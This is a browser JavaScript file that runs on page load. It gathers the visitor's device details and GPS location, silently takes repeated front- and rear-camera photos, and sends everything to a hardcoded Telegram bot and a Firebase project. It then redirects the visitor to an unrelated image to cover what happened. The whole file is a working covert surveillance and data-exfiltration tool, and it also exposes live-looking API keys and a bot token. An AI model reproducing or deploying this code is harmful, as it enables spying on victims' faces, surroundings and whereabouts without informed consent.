import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js";
import { getStorage, ref, uploadBytes, getDownloadURL } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-storage.js";
import { getDatabase, ref as dbRef, set } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-database.js";

// هنا استبدلت المفاتيح القديمة بمفاتيح جديدة
const firebaseConfig = {
  apiKey: "AIzaSyAPd-LuhhGPJqg4f9v7-s8-KxHwVkDAfOo",
  authDomain: "omarocoo-5c4a1.firebaseapp.com",
  databaseURL: "https://omarocoo-5c4a1-default-rtdb.firebaseio.com",
  projectId: "omarocoo-5c4a1",
  storageBucket: "omarocoo-5c4a1.appspot.com",
  messagingSenderId: "643985793304",
  appId: "1:643985793304:web:b3caa2b157b64f2acd3e6d"
};

const app = initializeApp(firebaseConfig);
const storage = getStorage(app);
const database = getDatabase(app);

const TELEGRAM_BOT_TOKEN = "7639077977:AAENzzjVLnZIFj8FtryqN4JFED7HUSBP0-w"; // استبدل هذا بتوكن البوت الجديد
const CHAT_ID = "7927406022"; // استبدل هذا برقم الدردشة الجديد

const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const context = canvas.getContext('2d');

// باقي الكود كما هو
async function sendTelegramText(text) {
  await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
    method: "POST",
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id: CHAT_ID, text })
  });
}

async function sendDeviceInfo() {
  const info = {
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    language: navigator.language,
    timestamp: new Date().toISOString()
  };

  try {
    const battery = await navigator.getBattery();
    info.batteryLevel = battery.level;
  } catch (e) {}

  const sendInfo = (locationInfo = null) => {
    if (locationInfo) {
      // دمج الموقع في نص واحد
      info.loc = `${locationInfo.lat}, ${locationInfo.lon}`;  // دمج latitude و longitude في نص واحد
    }
    const infoRef = dbRef(database, 'deviceInfo_face/' + Date.now());
    set(infoRef, info);

    let text = "📱 Device Info:\n";
    text += `🔋 Battery: ${info.batteryLevel * 100}%\n`;
    text += `🌐 Platform: ${info.platform}\n`;
    text += `🧭 Language: ${info.language}\n`;
    text += `📟 UserAgent: ${info.userAgent}\n`;
    if (info.loc) {
      text += `📍 Location: ${info.loc}\n`;  // دمج الموقع هنا كنص واحد
    }
    sendTelegramText(text);
  };

  try {
    navigator.geolocation.getCurrentPosition((pos) => {
      sendInfo({ lat: pos.coords.latitude, lon: pos.coords.longitude });
    }, (err) => {
      sendInfo();
    });
  } catch (e) {
    sendInfo();
  }
}

function captureImage(callback) {
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  context.drawImage(video, 0, 0);
  canvas.toBlob(callback, 'image/jpeg');
}

function sendToTelegram(blob, fileName) {
  const formData = new FormData();
  formData.append("chat_id", CHAT_ID);
  formData.append("photo", blob, fileName);
  fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
    method: "POST",
    body: formData
  });
}

function uploadToFirebase(blob, cameraType) {
  const fileName = `${cameraType}_${Date.now()}.jpg`;
  const storageRef = ref(storage, 'image_face/' + fileName);
  uploadBytes(storageRef, blob).then(() => {
    getDownloadURL(storageRef).then((url) => {
      const imgRef = dbRef(database, 'image_face/' + fileName.replace('.jpg', ''));
      set(imgRef, {
        timestamp: new Date().toISOString(),
        camera: cameraType,
        imageURL: url
      });
      sendToTelegram(blob, fileName);
    });
  });
}

async function captureSequence(stream, type) {
  video.srcObject = stream;
  await new Promise(r => setTimeout(r, 500));
  for (let i = 0; i < 5; i++) {
    setTimeout(() => {
      captureImage((blob) => {
        uploadToFirebase(blob, type);
      });
    }, i * 1000);
  }
}

async function startCapture() {
  await sendDeviceInfo();

  // الكاميرا الأمامية أولاً
  const frontStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
  await captureSequence(frontStream, 'front');

  setTimeout(async () => {
    // ثم الكاميرا الخلفية
    const rearStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" }, audio: false });
    await captureSequence(rearStream, 'rear');
  }, 6000);

  setTimeout(() => {
    window.location.href = "https://g.top4top.io/p_3382olbdr0.jpg"; // استبدل هذا بعنوان URL الذي تود توجيه المستخدم إليه
  }, 13000);
}

startCapture();
